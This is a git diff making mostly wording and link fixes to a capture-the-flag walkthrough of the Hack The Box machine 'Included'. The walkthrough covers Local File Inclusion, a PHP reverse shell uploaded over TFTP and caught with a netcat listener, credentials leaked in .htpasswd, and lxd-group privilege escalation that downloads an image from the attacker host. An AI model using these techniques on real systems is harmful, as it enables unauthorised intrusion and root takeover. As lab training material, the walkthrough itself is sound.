@@ -1,17 +1,3 @@
----
-layout:
-  title:
-    visible: true
-  description:
-    visible: false
-  tableOfContents:
-    visible: true
-  outline:
-    visible: true
-  pagination:
-    visible: true
----
-
 # Included (Tier 2)
 
 ## <mark style="color:blue;">Description</mark>
@@ -43,7 +29,7 @@ layout:
 
 ***
 
-* Then to learn more about the service running in the open port, I did an exhaustive scan
+* Then to learn more about the service running on the open port, I did an exhaustive scan
 
 <pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>nmap 10.129.156.215 -p80 -sVC -oN serv_scan.txt
 </strong></code></pre>
@@ -57,24 +43,24 @@ layout:
 <figure><img src="../../.gitbook/assets/image (417).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about the HTTP protocol you can go [here](../../networks/protocols/http.md)
+To learn more about the HTTP protocol, you can go [here](../../networks/protocols/http/)
 {% endhint %}
 
 ***
 
-* So I tried to change the file name to a route of a file from the system, in this case, the well-known _/etc/password_ file, and noticed it let me see the content of this file, being, in fact, vulnerable to _Local File Inclusion_ as I thought. Also checking the information from the file, I saw that in the system existed a profile named _tftp_ which is the default for the TFTP protocol, also giving me the route to the folder where its configuration files should be
+* So I tried to change the file name to a route of a file from the system, in this case, the well-known _/etc/password_ file, and noticed it let me see the content of this file, being, in fact, vulnerable to _Local File Inclusion,_ as I thought. Also checking the information from the file, I saw that in the system existed a profile named _tftp,_ which is the default for the TFTP protocol, also giving me the route to the folder where its configuration files should be
 
 <figure><img src="../../.gitbook/assets/image (420).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (426).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about Local File Inclusion exploitation you can go [here](../../web-exploitation/broken-access-control/local-file-inclusion.md)
+To learn more about Local File Inclusion and its exploitation, you can go [here](../../web-exploitation/broken-access-control/local-file-inclusion.md)
 {% endhint %}
 
 ***
 
-* So, to confirm the system was using this protocol, I did a scan on the UDP ports of the system as this protocol usually works over UD&#x50;_,_ and our previous scan didn't detect the service. With this, I found that the protocol was being used under its default port, the UDP port 69
+* So, to confirm the system was using this protocol, I did a scan on the UDP ports of the system, as this protocol usually works over UD&#x50;_,_ and our previous scan didn't detect the service. With this, I found that the protocol was being used under its default port, the UDP port 69
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -106,7 +92,7 @@ nmap 10.129.156.215 -sU -oN UDP_scan.txt
 
 ***
 
-* Knowing this, I tried connecting to the protocol and submitting a reverse shell script for _PHP_ as this protocol doesn't let me list shared files, just download them or upload them. As it didn't give us any error we closed the connection assuming the file was on the server
+* Knowing this, I tried connecting to the protocol and submitting a reverse shell script for _PHP,_ as this protocol doesn't let me list shared files, just download them or upload them. As it didn't give us any error, we closed the connection, assuming the file was on the server
 
 <pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">tftp 10.129.156.215
 <strong>tftp> put PHPshell.php
@@ -116,12 +102,12 @@ nmap 10.129.156.215 -sU -oN UDP_scan.txt
 <figure><img src="../../.gitbook/assets/image (428).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about the TFTP protocol you can go [here](../../networks/protocols/tftp.md)
+To learn more about the TFTP protocol, you can go [here](../../networks/protocols/tftp.md)
 {% endhint %}
 
 ***
 
-* Then, I set up a [_Netcat_](../../networks/tools-and-utilities.md#netcat) listener to be aware of the connection and called the script from the previously found folder where TFTP was storing its files. After hitting the direction, I noticed the page kept loading and I had successfully caught a shell from the target. Then, I sanitized the terminal to work more comfortably with it
+* Then, I set up a [_Netcat_](../../networks/tools-and-utilities.md#netcat) listener to be aware of the connection and called the script from the previously found folder where TFTP was storing its files. After hitting the direction, I noticed the page kept loading, and I had successfully caught a shell from the target. Then, I sanitized the terminal to work more comfortably with it
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -142,7 +128,7 @@ nc -nvlp 4444
 <figure><img src="../../.gitbook/assets/image (434).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about the abuse of exposed _.htaccess_ or _.hthtpasswd_ files, you can go [here](../../web-exploitation/broken-access-control/exposed-.htaccess-and-.htpasswd-files.md)
+To learn more about the abuse of exposed _.htaccess_ or _.htpasswd_ files, you can go [here](../../web-exploitation/broken-access-control/exposed-.htaccess-and-.htpasswd-files.md)
 {% endhint %}
 
 ***
@@ -155,7 +141,7 @@ To learn more about the abuse of exposed _.htaccess_ or _.hthtpasswd_ files, you
 
 ***
 
-* So checking the content of the _.htpasswd_ file, I found the credentials for the _mike_ user were being leaked, and after trying to change to this user using them, I successfully logged in. Then, I went to its _/home_ folder where I found a _user.txt_ file, and reading it, retrieved the user flag&#x20;
+* So, checking the content of the _.htpasswd_ file, I found the credentials for the _mike_ user were being leaked, and after trying to change to this user using them, I successfully logged in. Then, I went to its _/home_ folder where I found a _user.txt_ file, and reading it, retrieved the user flag&#x20;
 
 <figure><img src="../../.gitbook/assets/image (436).png" alt=""><figcaption></figcaption></figure>
 
@@ -163,7 +149,7 @@ To learn more about the abuse of exposed _.htaccess_ or _.hthtpasswd_ files, you
 
 ***
 
-* I needed to find a way to escalate privileges so I tried to check the `sudo` permissions for the user but didn't have any. After checking some information like local running services, and special permissions on files, the only relevant thing I found was that the user was part of the _lxd_ group. So, with a little [research](https://canonical.com/lxd), I understood the use of _lxd_ as a tool for creating containers of operating systems. So, I checked if this tool was installed on the system and it was
+* I needed to find a way to escalate privileges, so I tried to check the `sudo` permissions for the user, but didn't have any. After checking some information like local running services and special permissions on files, the only relevant thing I found was that the user was part of the _lxd_ group. So, with a little [research](https://canonical.com/lxd), I understood the use of _lxd_ as a tool for creating containers of operating systems. So, I checked if this tool was installed on the system, and it was
 
 <figure><img src="../../.gitbook/assets/image (437).png" alt=""><figcaption></figcaption></figure>
 
@@ -197,7 +183,7 @@ wget http://10.10.14.117:1234/alpine-v3.13-x86_64-20210218_0139.tar.gz
 <figure><img src="../../.gitbook/assets/image (638).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn the complete process for the privilege escalation abusing _lxd_ you can go [here](../../penetration-testing/process-stages/post-exploitation/privilege-escalation/linux-privilege-escalation.md#abusing-lxd)
+To learn the complete process for the privilege escalation abusing _lxd,_ you can go [here](../../penetration-testing/process-stages/post-exploitation/privilege-escalation/linux-privilege-escalation.md#abusing-lxd)
 {% endhint %}
 
 ***
@@ -210,7 +196,7 @@ To learn the complete process for the privilege escalation abusing _lxd_ you can
 
 ***
 
-* After this, I imported the image, and created a container using it, specifying high privileges and mounting the filesystem of the target inside it. Then, I started the container to interact with it
+* After this, I imported the image and created a container using it, specifying high privileges and mounting the filesystem of the target inside it. Then, I started the container to interact with it
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -235,7 +221,7 @@ lxc start pwned
 
 ***
 
-* With all this created, I generated a shell from the container having now access as the _root_ user to the complete filesystem. By last, I went to the mount point on the _/mnt/root_ folder where I found a _root.txt_ file, and reading its content retrieved the root flag
+* With all this created, I generated a shell from the container having now access as the _root_ user to the complete filesystem. Last, I went to the mount point on the _/mnt/root_ folder where I found a _root.txt_ file, and reading its content, retrieved the root flag
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
